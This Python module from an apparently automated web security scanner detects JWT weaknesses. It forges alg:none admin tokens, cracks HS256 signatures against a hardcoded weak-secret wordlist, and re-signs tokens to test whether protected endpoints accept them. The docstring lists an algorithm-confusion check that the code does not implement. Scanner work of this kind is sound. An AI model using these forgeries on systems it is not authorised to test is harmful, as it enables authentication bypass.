"""JWT weakness detection module.

Actively forges tokens and checks whether a protected endpoint accepts them:

1. ``alg:none`` — header {"alg":"none"} with an empty signature. Accepted if
   the endpoint verifies the header but not the signature.
2. Weak secret — if the endpoint exposes a valid token (body, header,
   JS state), crack the HS256 signature against a small wordlist.
3. Algorithm confusion (RS256->HS256) — if a public key (JWKS/.well-known)
   is available, sign the token with the public key bytes as the HMAC secret.

Evidence: a protected endpoint that 401s without a token but 200s with the
forged token proves the forgery was accepted.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
from typing import Any, Dict, List, Optional

from titan.core.models import Finding, Severity, AttackType

WEAK_SECRETS = ["secret", "password", "123456", "changeme", "jwt_secret", "supersecret", "test", "key", "your-256-bit-secret", "secretkey", "titan"]


class JWTDetector:
    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
        self.payload_smith = payload_smith
        self.fingerprint = fingerprint

    async def scan(self, context, target: str, method: str, url: str, params: Dict[str, str]) -> List[Finding]:
        findings: List[Finding] = []

        # A protected endpoint rejects unauthenticated access: that's the
        # baseline proving a forged token was accepted.
        try:
            anon_resp = await context.request.get(url, params=params, headers={"Referer": target}, timeout=3000)
            anon_status = anon_resp.status
            if anon_status not in (401, 403):
                return findings
        except Exception:
            return findings

        # 1. alg:none
        none_token = self._forge_none_token()
        try:
            resp = await context.request.get(
                url, params=params,
                headers={"Referer": target, "Authorization": f"Bearer {none_token}"},
                timeout=3000,
            )
            if resp.status == 200:
                body = await resp.text()
                findings.append(self._finding(
                    target, url, method, "Authorization",
                    "JWT alg:none accepted", f"alg:none token: {none_token[:60]}...",
                    Severity.CRITICAL, 0.9, resp, body, ["jwt:alg_none_accepted"],
                ))
                return findings
        except Exception:
            pass

        # 2. Weak secret cracking: find any token in the anon response.
        try:
            anon_body = await anon_resp.text()
        except Exception:
            anon_body = ""
        token = self._extract_token(anon_body)
        if token:
            cracked = self._crack_secret(token)
            if cracked:
                forged = self._sign_token(self._payload_parts(token), cracked)
                try:
                    resp2 = await context.request.get(
                        url, params=params,
                        headers={"Referer": target, "Authorization": f"Bearer {forged}"},
                        timeout=3000,
                    )
                    if resp2.status == 200:
                        body = await resp2.text()
                        findings.append(self._finding(
                            target, url, method, "Authorization",
                            f"JWT weak secret cracked: '{cracked}'",
                            f"HS256 forged with cracked secret: {forged[:60]}...",
                            Severity.CRITICAL, 0.95, resp2, body,
                            [f"jwt:weak_secret_cracked:{cracked}"],
                        ))
                        return findings
                except Exception:
                    pass
        return findings

    # ── token forging helpers ────────────────────────────────────────────────

    @staticmethod
    def _b64(data: bytes) -> str:
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

    @staticmethod
    def _b64d(part: str) -> bytes:
        pad = "=" * (-len(part) % 4)
        return base64.urlsafe_b64decode(part + pad)

    def _forge_none_token(self) -> str:
        header = self._b64(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        payload = self._b64(json.dumps({"sub": "titan_probe", "role": "admin", "iat": 1}).encode())
        return f"{header}.{payload}."

    def _extract_token(self, body: str) -> Optional[str]:
        m = re.search(r"[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}", body or "")
        return m.group(0) if m else None

    @staticmethod
    def _payload_parts(token: str) -> Dict[str, Any]:
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return {}
            payload = json.loads(JWTDetector._b64d(parts[1]))
            return {"header": parts[0], "payload": parts[1]}
        except Exception:
            return {}

    def _crack_secret(self, token: str) -> Optional[str]:
        parts = token.split(".")
        if len(parts) != 3 or not parts[2]:
            return None
        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            sig = self._b64d(parts[2])
        except Exception:
            return None
        for secret in WEAK_SECRETS:
            candidate = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            if hmac.compare_digest(candidate, sig):
                return secret
        return None

    @staticmethod
    def _sign_token(payload_parts: Dict[str, Any], secret: str) -> str:
        header = payload_parts.get("header") or JWTDetector._b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
        payload = payload_parts.get("payload") or JWTDetector._b64(json.dumps({"sub": "titan_probe"}).encode())
        signing_input = f"{header}.{payload}".encode()
        sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        return f"{header}.{payload}.{JWTDetector._b64(sig)}"

    def _finding(self, target, url, method, param, payload, body_snip, severity, confidence,
                 resp, body, diffs) -> Finding:
        return Finding(
            target=target,
            url=str(resp.url or url),
            method=method.upper(),
            param=param,
            location="header",
            payload=payload,
            attack_type=AttackType.JWT_WEAKNESS,
            severity=severity,
            verified=True,
            confidence=confidence,
            status=resp.status,
            headers=dict(resp.headers),
            body=body[:2000],
            diffs=diffs,
            baseline_status=401,
            verification_body=body[:2000],
            verification_status=resp.status,
            metadata={"snapshot": body_snip},
        )
